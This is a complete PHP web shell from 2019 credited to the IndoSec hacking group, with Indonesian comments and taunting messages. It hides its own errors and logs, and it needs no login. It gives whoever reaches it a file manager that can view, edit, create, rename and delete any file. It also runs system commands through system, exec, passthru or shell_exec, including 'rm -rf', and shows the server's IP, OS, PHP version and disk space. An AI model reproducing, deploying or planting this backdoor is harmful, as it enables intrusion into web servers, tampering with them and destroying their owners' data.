<?php
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';
date_default_timezone_set("Asia/Jakarta");



/*
	* Konsep Shell : By Me [Arikun]-
	* Pembuat : Arikun - { IndoSec }
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
	* Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
	* https://www.youtube.com/playlist?list=PLAAbQaUpDeM7nGwS6WfaTm_cPC3RUiswi

	* Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	* { IndoSec sHell }
	* �2019 { IndoSec } -Arikun-
	* Contact Me? fb.com/uhuy.kun, WhatsApp? Cek Bio Fb
	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.1


	Special Thanks : IndoSec | IndoXploit
*/

?>


<!DOCTYPE HTML>
<html>
<head>
<title>MIntak Shell</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
</head>
<body style="background-color: rgb(52,58,64); color: white;">

	<style type="text/css">
		a{
			color: white;
		}
		html{
			color: white;
		}
		.about .card-body .img{
				position: relative;
				background: url(https://i.postimg.cc/Wb1X4xNS/image.png);
				background-size: cover;
				width: 150px;
				height: 150px;
			}
			.about .card-body .img2{
				position: relative;
				background: url(https://scontent.fcgk4-3.fna.fbcdn.net/v/t1.0-9/p960x960/76651726_435430327171127_1996148624194535424_o.jpg?_nc_cat=108&_nc_eui2=AeE-0O8bxm5LN7KBM_z5119J0j5DajhU0N1nLR96jj_KfW77hLg-wOW6fB1Fs7NJMKXPNIEn1HfC3YVSpsPdMQBTRLpUe6QSSKwmS1MRTFUolQ&_nc_ohc=3ZwMXzp-CzoAQlMBrSVqtkDZZYVsG04XhWwusBsSInEUpAyQC4AFW476g&_nc_ht=scontent.fcgk4-3.fna&oh=fa9eb3429702446214d9b71376031cf8&oe=5EA4CCA7);
				background-size: cover;
				width: 150px;
				height: 150px;
	</style>
<div class="container mt-4">
<h5>System Information : <button type="button" class="btn btn-danger btn-sm" data-toggle="modal" data-target="#exampleModal">Here Bitch!</button> <br> <br>  <a href="?"><button type="button" class="btn btn-warning btn-sm"><i class="fa fa-home"></i> Home </button></a> <button type="button" class="btn btn-warning btn-sm" data-toggle="modal" data-target="#file"><i class="fa fa-plus"></i> New File</button> <button type="button" class="btn btn-warning btn-sm" data-toggle="modal" data-target="#folder"><i class="fa fa-plus"></i> New Folder</button></h5><br>
</div>
<div class="container mt-2">
	<div class="table-responsive">
<?php
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}

function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}




function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function save($filename, $mode, $file) {
	$handle = fopen($filename, $mode);
	fwrite($handle, $file);
	fclose($handle);
	return;
}


function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

function files_and_folder() {
	if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
	if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
	print '
<font color="white">
	<table class="table table-hover ">
		   <tr>
		   <th><center><font color="white">Nama</font></center></th>
		   <th><center><font color="white">Tipe</font></center></th>
		   <th><center><font color="white">Size</font></center></th>
		   <th><center><font color="white">Reload</font></center></th>
		   <th><center><font color="white">OWner</font></center></th>
		   <th><center><font color="white">Perm</font></center></th>
		   <th><center><font color="white">Action</font></center></th>
		   </tr>
</font>
		   ';

	if(function_exists('opendir')) {
		if($opendir = opendir(path())) {
			while(($readdir = readdir($opendir)) !== false) {
				$dir[] = $readdir;
			}
			closedir($opendir);
		}
		sort($dir);
	} else {
		$dir = scandir(path());
	}

	foreach($dir as $folder) {
		$dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
		if(!is_dir($dirinfo['path'])) continue;
		$dirinfo['type']  = filetype($dirinfo['path']);
		$dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
		$dirinfo['size']  = "-";
		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a class='a' href='?act=newfile&dir=".path()."'><i class='fa fa-plus'></i> File</a> | <a href='?act=newfolder&dir=".path()."'><i class='fa fa-plus'> Folder</i></a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'><i class='fa fa-pencil'></i> Rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'><i class='fa fa-trash'></i> Delete</a>";
		if(function_exists('posix_getpwuid')) {
			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
			$dirinfo['owner'] = $dirinfo['owner']->name;
		} else {
			$dirinfo['owner'] = fileowner($dirinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
			$dirinfo['group'] = $dirinfo['group']->name;
		} else {
			$dirinfo['group'] = filegroup($dirinfo['path']);
		}
		print "<tr>";
		print "<td class='img-fluid'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>".$dirinfo['link']."</td>";
		print "<td style='text-align: center;'><font color='white'>".$dirinfo['type']."</font></td>";
		print "<td style='text-align: center;'><font color='white'>".$dirinfo['size']."</font></td>";
		print "<td style='text-align: center;'><font color='white'>".$dirinfo['time']."</font></td>";
		print "<td style='text-align: center;'><font color='white'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</font></td>";
		print "<td class='td_home' style='text-align: center;'><font color='white'>".$dirinfo['perms']."</font></td>";
		print "<td class='td_home' style='padding-left: 15px;'><font color='white'>".$dirinfo['action']."</font></td>";
		print "</tr>";
	}
	foreach($dir as $files) {
		$fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
		if(!is_file($fileinfo['path'])) continue;
		$fileinfo['type'] = filetype($fileinfo['path']);
		$fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
		$fileinfo['size'] = filesize($fileinfo['path'])/1024;
		$fileinfo['size'] = round($fileinfo['size'],3);
		$fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
		$fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
		if(function_exists('posix_getpwuid')) {
			$fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
			$fileinfo['owner'] = $fileinfo['owner']->name;
		} else {
			$fileinfo['owner'] = fileowner($fileinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
			$fileinfo['group'] = $fileinfo['group']->name;
		} else {
			$fileinfo['group'] = filegroup($fileinfo['path']);
		}
		print "<tr>";
		print "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
		print "<td style='text-align: center;'><font color='white'>".$fileinfo['type']."</font></td>";
		print "<td style='text-align: center;'><font color='white'>".$fileinfo['size']."</font></td>";
		print "<td style='text-align: center;'><font color='white'>".$fileinfo['time']."</font></td>";
		print "<td style='text-align: center;'><font color='white'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</font></td>";
		print "<td class='td_home' style='text-align: center;'><font color='white'>".$fileinfo['perms']."</font></td>";
		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'><i class='fa fa-pencil'> Edit</i></a> <font color='white'>|</font> <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'><i class='fa fa-eraser'></i> Rename</a> <font color='white'>|</font> <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'><i class='fa fa-trash'></i> Delete</a> </td>";
		print "</tr>";
	}

	print "</table>";
}


function action() {
	print "</center>";

	if(isset($_GET['do'])) {
		files_and_folder();	
	}
	elseif(isset($_GET['act'])) {
		if($_GET['act'] === 'newfile') {
		echo "<script>window.alert('Ada Tombol Add File Mz')</script>";
		echo "<script>history.back()</script>";
		} 
		elseif($_GET['act'] === 'newfolder') {
			echo "<script>window.alert('Ada Tombol Add Folder Mz')</script>";
		echo "<script>history.back()</script>";
		} 
		elseif($_GET['act'] === 'rename_folder') {
			if($_POST['save']) {
				$rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
				if($rename_folder) {
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			print "$act<br>";
			}
			print "<form method='post'>
			<input type='text' class='form-control' value='".basename(path())."' name='foldername' style='width: 450px;' height='100'>
			<input type='submit' class='btn btn-info input' name='save' value='RENAME'>
			</form>";
		} 
		elseif($_GET['act'] === 'delete_folder') {
			if(is_dir(path())) {
				if(is_writable(path())) {
					@rmdir(path());
					if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
					if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";

				} 
				else {
					$act = color(1, 1, "Could not remove directory '".basename(path())."'");
				}
			}
			print $act;
			echo "<script>window.alert('Sudah Berhasil Di Hapus, Silahkan Tekan Home.');</script>";
		} 
		elseif($_GET['act'] === 'view') {
			print "Filename: ".color(1, 2, basename($_GET['file']))." ".writeable($_GET['file'], perms($_GET['file']))."<br>";
			print " <a href='?act=view&dir=".path()."&file=".$_GET['file']."' class='btn btn-info'><b>view</b></a>  <a class='btn btn-success' href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a>  <a href='?act=rename&dir=".path()."&file=".$_GET['file']."' class='btn btn-warning'>rename</a>  <a href='?act=delete&dir=".path()."&file=".$_GET['file']."' class='btn btn-danger'>delete</a> <br>";
			print "<textarea readonly class='form-control'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
		} 
		elseif($_GET['act'] === 'edit') {
			if($_POST['save']) {
				$save = file_put_contents($_GET['file'], $_POST['src']);
				if($save) {
					$act = color(1, 2, "File Saved!");
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}

			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "<a href='?act=view&dir=".path()."&file=".$_GET['file']."' class='btn btn-info'><b>view</b></a>  <a class='btn btn-success' href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a>  <a href='?act=rename&dir=".path()."&file=".$_GET['file']."' class='btn btn-warning'>rename</a>  <a href='?act=delete&dir=".path()."&file=".$_GET['file']."' class='btn btn-danger'>delete</a> <br>";
			print "<form method='post'>
			<textarea name='src' class='form-control'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
			<input type='submit' class='btn btn-success input' value='SAVE' name='save' style='width: 500px;'>
			</form>";
		} 
		elseif($_GET['act'] === 'rename') {
			if($_POST['save']) {
				$rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
				if($rename) {
					$act = "<script>window.location='?dir=".path()."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}

			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "<a href='?act=view&dir=".path()."&file=".$_GET['file']."' class='btn btn-info'><b>view</b></a>  <a class='btn btn-success' href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a>  <a href='?act=rename&dir=".path()."&file=".$_GET['file']."' class='btn btn-warning'>rename</a>  <a href='?act=delete&dir=".path()."&file=".$_GET['file']."' class='btn btn-danger'>delete</a> <br>";
			print "<form method='post'>
			<input type='text' value='".basename($_GET['file'])."' class='form-control' name='filename' style='width: 450px;' height='10'>
			<input type='submit' class='btn btn-success input' name='save' value='RENAME'>
			</form>";
		}
		elseif($_GET['act'] === 'delete') {
			$delete = unlink($_GET['file']);
			if($delete) {
				$act = "<script>window.location='?dir=".path()."';</script>";
				header("location: ?");
			} 
			else {
				$act = color(1, 1, "Permission Denied!");
			}
			print $act;
		}
	}
	else {
		files_and_folder();
	}
}


action();
?>


<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-2" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel"><font color='black'>Your System Information</font></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <font color="black">
        	<font color="red" size="2">Your Browser : </font><font color="black" size="2"><?php echo $_SERVER['HTTP_USER_AGENT'];?><br>
        	<font color="red" size="2">SERVER IP : </font><font color="black" size="2"><?php echo getHostByName(getHostName()); ?><br>
        	<font color="red" size="2">SERVER NAME : </font><font color="black" size="2"><?php echo $_SERVER['SERVER_NAME'];?><br>
        	<font color="red" size="2">SERVER SOFTWARE : </font><font color="black" size="2"><?php echo $_SERVER['SERVER_SOFTWARE'];?><br>
        	<font color="red" size="2">SERVER PROTOCOL : </font><font color="black" size="2"><?php echo $_SERVER['SERVER_PROTOCOL'];?><br>
        	<font color="red" size="2">SERVER GATEWAY : </font><font color="black" size="2"><?php echo $_SERVER['GATEWAY_INTERFACE'];?><br>
        	<font color="red" size="2">SERVER OS : </font><font color="black" size="2"><?php echo php_uname();?><br>
        	<font color="red" size="2">SERVER PHP VERSION : </font><?php echo phpversion();?><br>
        	

<font color="red" size="2">SERVER CURL : </font>
        <?php echo $curl = (function_exists('curl_version')) ? "<font color=green size=2>ON</font>" : "<font color=red size=2>OFF</font>";?><br>

<font color="red" size="2">SERVER Mailler : </font>
        <?php echo $mail = (function_exists('mail')) ? "<font color=green size=2>ON</font>" : "<font color=red size=2>OFF</font>";?><br>

<font color="red" size="2">SERVER MysQL : </font>
        <?php echo $sequil = (function_exists('mysql_connect')) ? "<font color=green size=2>ON</font>" : "<font color=red size=2><font color=black>- </font>OFF<font color=black> -</font></font>";?><br>

<?php
if(isset($_GET['dir'])){
	$dir = $_GET['dir'];
	chdir($dir);
}else{
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$total = disk_total_space($dir);
$free = disk_free_space($dir);
$pers =  (int) ($free/$total*100);

function formatSize( $bytes ){
	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
	return( round( $bytes, 2 )." ".$types[$i] );
}
?>


<font color="red" size="2">SERVER DISK : </font>
        <?php echo "<td class='d-flex'>Total : ".formatSize($total)." Free : ".formatSize($free)." [".$pers."%]</td>";?><br>
        	<font color="red">
        			ZUAHAHAHAA :V LOST AGAIN :)
        	</font>

        </font>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>




<div class="modal fade" id="file" tabindex="-2" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel"><font color='black'>File Create</font></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
      	<?php
      if($_POST['save']) {
				$filename = htmlspecialchars($_POST['filename']);
				$fopen    = fopen($filename, "a+");
				if($fopen) {
					$act = "<script>window.location='?act=edit&dir=".path()."&file=".$_POST['filename']."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			}
			print $act;
			print "<form method='post'>
			Filename: <input type='text' class='form-control' name='filename' width='40' value='".path()."/newfile.php' style='width: 450px;' height='10'>
			

      </div>
      <div class='modal-footer'>
        <input type='submit' class='btn btn-success' name='save' value='SUBMIT'>
      </div>
      </form>";
			?>
    </div>
  </div>
</div>





<div class="modal fade" id="folder" tabindex="-2" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel"><font color='black'>Folder Create</font></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
      	<?php 
      	if($_POST['save']) {
				$foldername = path().'/'.htmlspecialchars($_POST['foldername']);
				if(!@mkdir($foldername)) {
					$act = color(1, 1, "Permission Denied!");
				} 
				else {
					$act = "<script>window.location='?dir=".path()."';</script>";
				}
			}
			print $act;
			print "<form method='post'>
			Folder Name: <input type='text' class='form-control' name='foldername' style='width: 450px;' height='10'>
			
      </div>
      <div class='modal-footer'>
        <input type='submit' class='input btn btn-success' name='save' value='SUBMIT'>
			</form>
      </div>
      ";
      ?>
      </form>
    </div>
  </div>
</div>
</div>
<div class="container">
	<div class="row">
<div class="col-md-6 mt-4">
	<div class="card text-center bg-light about">
		<h4 class="card-header">{ IndoSec }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ IndoSec } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { IndoSec }</small>
		</div>
	</div>
	<br>
</div>
<div class="col-md-6 mt-4">
	<div class="card text-center bg-light about">
		<h4 class="card-header">{ IndramayuCyber }</h4>
		<div class="card-body">
			<center><div class="img2"></div></center>
			<p class="card-text">IndramayuCyber Adalah Sebuah Komunitas IT yang berada di daerah Indramayu Kota Dan Sekitarnya.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { IndoSec }</small>
		</div>
	</div>
	<br>
</div>
</div>

</div>

</div>

</div>


</div>
<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
</body>
</html>